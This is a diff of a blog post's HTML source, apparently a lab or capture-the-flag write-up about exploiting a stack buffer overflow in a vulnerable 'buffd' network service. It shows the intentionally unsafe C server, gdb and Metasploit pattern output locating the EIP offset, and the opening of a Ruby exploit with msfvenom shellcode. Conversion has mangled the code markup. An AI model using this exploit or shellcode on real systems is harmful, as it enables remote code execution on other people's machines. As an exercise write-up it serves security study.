-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addr</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addrlen</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">server</span><span class="p">:</span> <span class="n">bind</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="k">continue</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">break</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">server</span><span class="p">:</span> <span class="n">failed</span> <span class="n">to</span> <span class="n">bind</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">freeaddrinfo</span><span class="p">(</span><span class="n">servinfo</span><span class="p">);</span> <span class="c1">// all done with this structure&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">BACKLOG</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">listen</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">sigchld_handler</span><span class="p">;</span> <span class="c1">// reap all dead processes</span>
-</span><span class='line'><span class="n">sigemptyset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_mask</span><span class="p">);</span>
-</span><span class='line'><span class="n">sa</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">=</span> <span class="n">SA_RESTART</span><span class="p">;</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">sigaction</span><span class="p">(</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">sa</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">sigaction</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">server</span><span class="p">:</span> <span class="n">waiting</span> <span class="k">for</span> <span class="n">connections</span><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// main accept() loop</span>
-</span><span class='line'><span class="n">sin_size</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">their_addr</span><span class="p">;</span>
-</span><span class='line'><span class="n">new_fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">their_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">sin_size</span><span class="p">);</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">new_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">accept</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="k">continue</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">inet_ntop</span><span class="p">(</span><span class="n">their_addr</span><span class="p">.</span><span class="n">ss_family</span><span class="p">,</span>
-</span><span class='line'><span class="n">get_in_addr</span><span class="p">((</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">their_addr</span><span class="p">),</span>
-</span><span class='line'><span class="n">s</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">s</span><span class="p">);</span>
-</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">server</span><span class="p">:</span> <span class="n">got</span> <span class="n">connection</span> <span class="n">from</span> <span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">s</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fork</span><span class="p">())</span> <span class="p">{</span> <span class="c1">// this is the child process</span>
-</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span> <span class="c1">// child doesn&amp;rsquo;t need the listener</span>
-</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">net_buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
-</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">HELO</span><span class="err">\</span><span class="nl">nCOMMAND</span><span class="p">:</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">send</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">out_buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">send</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">recv</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'><span class="n">vulnerable</span><span class="p">(</span><span class="n">net_buffer</span><span class="p">);</span>
-</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">RECV</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="n">strcat</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">);</span>
-</span><span class='line'><span class="n">send</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">out_buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">new_fd</span><span class="p">);</span>
-</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">new_fd</span><span class="p">);</span> <span class="c1">// parent doesn&amp;rsquo;t need this</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock lang:c %}
+debian:/tmp# cat /var/www/repo/buffd.c</p>
+
+<h1>include &lt;stdio.h></h1>
+
+<h1>include &lt;stdlib.h></h1>
+
+<h1>include &lt;unistd.h></h1>
+
+<h1>include &lt;errno.h></h1>
+
+<h1>include &lt;string.h></h1>
+
+<h1>include &lt;sys/types.h></h1>
+
+<h1>include &lt;sys/socket.h></h1>
+
+<h1>include &lt;netinet/in.h></h1>
+
+<h1>include &lt;netdb.h></h1>
+
+<h1>include &lt;arpa/inet.h></h1>
+
+<h1>include &lt;sys/wait.h></h1>
+
+<h1>include &lt;signal.h></h1>
+
+<h1>define PORT &ldquo;7777&rdquo; // the port users will be connecting to</h1>
+
+<h1>define BACKLOG 10       // how many pending connections queue will hold</h1>
+
+<p>void vulnerable(char *net_buffer)
+{
+char local_buffer[120];
+strcpy(local_buffer, net_buffer);
+return;
+}</p>
+
+<p>void sigchld_handler(int s)
+{
+while(waitpid(-1, NULL, WNOHANG) > 0);
+}</p>
+
+<p>// get sockaddr, IPv4 or IPv6:
+void <em>get_in_addr(struct sockaddr </em>sa)
+{
+if (sa->sa_family == AF_INET) {
+return &amp;(((struct sockaddr_in*)sa)->sin_addr);
+}</p>
+
+<p>return &amp;(((struct sockaddr_in6*)sa)->sin6_addr);
+}</p>
+
+<p>int main(void)
+{
+int sockfd, new_fd; // listen on sock_fd, new connection on new_fd
+struct addrinfo hints, <em>servinfo, </em>p;
+struct sockaddr_storage their_addr; // connector&rsquo;s address information
+socklen_t sin_size;
+struct sigaction sa;
+int yes=1;
+char in_buffer[20], out_buffer[20], net_buffer[2048];
+char s[INET6_ADDRSTRLEN];
+int rv;</p>
+
+<p>memset(&amp;hints, 0, sizeof hints);
+hints.ai_family = AF_UNSPEC;
+hints.ai_socktype = SOCK_STREAM;
+hints.ai_flags = AI_PASSIVE; // use my IP</p>
+
+<p>if ((rv = getaddrinfo(NULL, PORT, &amp;hints, &amp;servinfo)) != 0) {
+fprintf(stderr, &ldquo;getaddrinfo: %s\n&rdquo;, gai_strerror(rv));
+return 1;
+}</p>
+
+<p>// loop through all the results and bind to the first we can
+for(p = servinfo; p != NULL; p = p->ai_next) {
+if ((sockfd = socket(p->ai_family, p->ai_socktype,
+p->ai_protocol)) == -1) {
+perror(&ldquo;server: socket&rdquo;);
+continue;
+}</p>
+
+<p>if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;yes,
+sizeof(int)) == -1) {
+perror(&ldquo;setsockopt&rdquo;);
+exit(1);
+}</p>
+
+<p>if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
+close(sockfd);
+perror(&ldquo;server: bind&rdquo;);
+continue;
+}</p>
+
+<p>break;
+}</p>
+
+<p>if (p == NULL) {
+fprintf(stderr, &ldquo;server: failed to bind\n&rdquo;);
+return 2;
+}</p>
+
+<p>freeaddrinfo(servinfo); // all done with this structure</p>
+
+<p>if (listen(sockfd, BACKLOG) == -1) {
+perror(&ldquo;listen&rdquo;);
+exit(1);
+}</p>
+
+<p>sa.sa_handler = sigchld_handler; // reap all dead processes
+sigemptyset(&amp;sa.sa_mask);
+sa.sa_flags = SA_RESTART;
+if (sigaction(SIGCHLD, &amp;sa, NULL) == -1) {
+perror(&ldquo;sigaction&rdquo;);
+exit(1);
+}</p>
+
+<p>printf(&ldquo;server: waiting for connections&hellip;\n&rdquo;);</p>
+
+<p>while(1) { // main accept() loop
+sin_size = sizeof their_addr;
+new_fd = accept(sockfd, (struct sockaddr *)&amp;their_addr, &amp;sin_size);
+if (new_fd == -1) {
+perror(&ldquo;accept&rdquo;);
+continue;
+}</p>
+
+<p>inet_ntop(their_addr.ss_family,
+get_in_addr((struct sockaddr *)&amp;their_addr),
+s, sizeof s);
+printf(&ldquo;server: got connection from %s\n&rdquo;, s);</p>
+
+<p>if (!fork()) { // this is the child process
+close(sockfd); // child doesn&rsquo;t need the listener
+memset(net_buffer, 0, 1024);
+strcpy(out_buffer, &ldquo;HELO\nCOMMAND:&rdquo;);
+if (send(new_fd, out_buffer, strlen(out_buffer), 0) == -1)
+perror(&ldquo;send&rdquo;);
+if (recv(new_fd, net_buffer, 1024, 0))
+{
+vulnerable(net_buffer);
+strcpy(out_buffer, &ldquo;RECV: &rdquo;);
+strcat(out_buffer, net_buffer);
+send(new_fd, out_buffer, strlen(out_buffer), 0);
+}
+close(new_fd);
+exit(0);
+}
+close(new_fd); // parent doesn&rsquo;t need this
+}</p>
+
+<p>return 0;
+}
+{% endcodeblock %}</p>
 
 <p>We copy buffd binary from server (/usr/local/sbin/buffd) and using metasploit
 patterns we calculate the offset for EIP. To make an exploit reliable, we are
 looking also for some registers, pointing to our pattern in memory.
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/repo# gdb ./buffd  -q
-</span><span class='line'>Reading symbols from /root/repo/buffd&hellip;done.
-</span><span class='line'>(gdb) set follow-fork-mode child
-</span><span class='line'>(gdb) run
-</span><span class='line'>Starting program: /root/repo/buffd
-</span><span class='line'>warning: no loadable sections found in added symbol-file system-supplied DSO at 0xb7fe0000
-</span><span class='line'>server: waiting for connections&hellip;
-</span><span class='line'>server: got connection from 127.0.0.1
-</span><span class='line'>[New process 4201]&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>[Switching to process 4201]
-</span><span class='line'>0x65413165 in ?? ()
-</span><span class='line'>(gdb) i r
-</span><span class='line'>eax            0xbfffe790       -1073748080
-</span><span class='line'>ecx            0x0      0
-</span><span class='line'>edx            0xca     202
-</span><span class='line'>ebx            0xb7fbeff4       -1208225804
-</span><span class='line'>esp            0xbfffe810       0xbfffe810
-</span><span class='line'>ebp            0x41306541       0x41306541
-</span><span class='line'>esi            0x0      0
-</span><span class='line'>edi            0x0      0
-</span><span class='line'>eip            0x65413165       0x65413165
-</span><span class='line'>eflags         0x10246  [ PF ZF IF RF ]
-</span><span class='line'>cs             0x73     115
-</span><span class='line'>ss             0x7b     123
-</span><span class='line'>ds             0x7b     123
-</span><span class='line'>es             0x7b     123
-</span><span class='line'>fs             0x0      0
-</span><span class='line'>gs             0x33     51
-</span><span class='line'>(gdb) x /5x $eax
-</span><span class='line'>0xbfffe790:     0x41306141      0x61413161      0x33614132      0x41346141
-</span><span class='line'>0xbfffe7a0:     0x61413561&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root@kali32:~# nc 127.0.0.1 7777
-</span><span class='line'>HELO
-</span><span class='line'>COMMAND:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-</span><span class='line'>^C
-</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x65413165
-</span><span class='line'>[&lt;em>] Exact match at offset 124
-</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41306141
-</span><span class='line'>[&lt;/em>] Exact match at offset 0</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+root@kali32:~/repo# gdb ./buffd  -q
+Reading symbols from /root/repo/buffd&hellip;done.
+(gdb) set follow-fork-mode child
+(gdb) run
+Starting program: /root/repo/buffd
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0xb7fe0000
+server: waiting for connections&hellip;
+server: got connection from 127.0.0.1
+[New process 4201]</p>
+
+<p>Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 4201]
+0x65413165 in ?? ()
+(gdb) i r
+eax            0xbfffe790       -1073748080
+ecx            0x0      0
+edx            0xca     202
+ebx            0xb7fbeff4       -1208225804
+esp            0xbfffe810       0xbfffe810
+ebp            0x41306541       0x41306541
+esi            0x0      0
+edi            0x0      0
+eip            0x65413165       0x65413165
+eflags         0x10246  [ PF ZF IF RF ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) x /5x $eax
+0xbfffe790:     0x41306141      0x61413161      0x33614132      0x41346141
+0xbfffe7a0:     0x61413561</p>
+
+<p>root@kali32:~# nc 127.0.0.1 7777
+HELO
+COMMAND:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+^C
+root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x65413165
+[<em>] Exact match at offset 124
+root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41306141
+[</em>] Exact match at offset 0
+{% endcodeblock %}</p>
 
 <p>EIP begins on offset 124 and the register EAX points to the beginning of our
 buffer, right now filled with pattern. Luckily, we find call eax opcodes in
@@ -521,242 +300,145 @@ binary too.</p>
 <p>The strange thing is that the stack in binary is marked as non-executable,
 but on this server the exploit works and we don&rsquo;t get segfault:</p>
 
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/home/testuser $ readelf -lW /usr/local/sbin/buffd
-</span><span class='line'>Elf file type is EXEC (Executable file)
-</span><span class='line'>Entry point 0x80488e0
-</span><span class='line'>There are 7 program headers, starting at offset 52&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>Program Headers:
-</span><span class='line'>  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
-</span><span class='line'>  PHDR           0x000034 0x08048034 0x08048034 0x000e0 0x000e0 R E 0x4
-</span><span class='line'>  INTERP         0x000114 0x08048114 0x08048114 0x00013 0x00013 R   0x1
-</span><span class='line'>      [Requesting program interpreter: /lib/ld-linux.so.2]
-</span><span class='line'>  LOAD           0x000000 0x08048000 0x08048000 0x01004 0x01004 R E 0x1000
-</span><span class='line'>  LOAD           0x001004 0x0804a004 0x0804a004 0x00170 0x0017c RW  0x1000
-</span><span class='line'>  DYNAMIC        0x001018 0x0804a018 0x0804a018 0x000d0 0x000d0 RW  0x4
-</span><span class='line'>  NOTE           0x000128 0x08048128 0x08048128 0x00020 0x00020 R   0x4
-</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4</span></code></pre></td></tr></table></div></figure></p>
+<p>{% codeblock %}
+www-data@:/home/testuser $ readelf -lW /usr/local/sbin/buffd
+Elf file type is EXEC (Executable file)
+Entry point 0x80488e0
+There are 7 program headers, starting at offset 52</p>
+
+<p>Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x000e0 0x000e0 R E 0x4
+  INTERP         0x000114 0x08048114 0x08048114 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08048000 0x08048000 0x01004 0x01004 R E 0x1000
+  LOAD           0x001004 0x0804a004 0x0804a004 0x00170 0x0017c RW  0x1000
+  DYNAMIC        0x001018 0x0804a018 0x0804a018 0x000d0 0x000d0 RW  0x4
+  NOTE           0x000128 0x08048128 0x08048128 0x00020 0x00020 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+{% endcodeblock %}</p>
 
 <p>Exploit in Ruby:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">root</span><span class="vi">@kali32</span><span class="ss">:~</span><span class="c1"># cat exploit.rb&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;!</span><span class="sr">/usr/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;p&gt;require &amp;lsquo;socket&amp;rsquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">root</span><span class="vi">@kali32</span><span class="ss">:~</span><span class="c1"># /usr/share/metasploit-framework/msfelfscan -j ebp,ebx,esp,eax repo/buffd&lt;/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;[</span><span class="n">repo</span><span class="o">/</span><span class="n">buffd</span><span class="o">]&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;h1&gt;0x0804898f call eax&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="mh">0x08048efb</span> <span class="n">call</span> <span class="n">eax</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;h1&gt;root@kali32:~# /us</span><span class="n">r</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">msfvenom</span> <span class="o">-</span><span class="nb">p</span> <span class="n">linux</span><span class="o">/</span><span class="n">x86</span><span class="o">/</span><span class="nb">exec</span> <span class="o">-</span><span class="n">b</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;\</span><span class="n">x00</span><span class="p">\</span><span class="n">xff</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="no">CMD</span><span class="o">=&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">commands</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">-</span><span class="n">f</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="sr">&lt;p&gt;buf =</span>
-</span><span class='line'><span class="sr">&amp;ldquo;\xdd\xc2\xd9\x74\x24\xf4\xbd\x38\x6f\xc2\x8c\x58\x33\xc9&amp;rdquo; +</span>
-</span><span class='line'><span class="sr">&amp;ldquo;\xb1\x0d\x31\x68\x18\x03\x68\x18\x83\xc0\x3c\x8d\x37\xe6&amp;rdquo; +</span>
-</span><span class='line'><span class="sr">&amp;ldquo;\x37\x09\x21\xa5\x21\xc1\x7c\x29\x24\xf6\x17\x82\x45\x91&amp;rdquo; +</span>
-</span><span class='line'><span class="sr">&amp;ldquo;\xe7\xb4\x86\x03\x81\x2a\x51\x20\x03\x5b\x6f\xa7\xa4\x9b&amp;rdquo; +</span>
-</span><span class='line'><span class="sr">&amp;ldquo;\x40\xd3\xc9\xeb\xb1\x78\x7d\x61\xa0\x1f\xef\x1d\x49\xe0&amp;rdquo; +</span>
-</span><span class='line'><span class="sr">&amp;ldquo;\xb8\x8e\x24\x01\x8b\xb1&amp;rdquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
-</span><span class='line'>
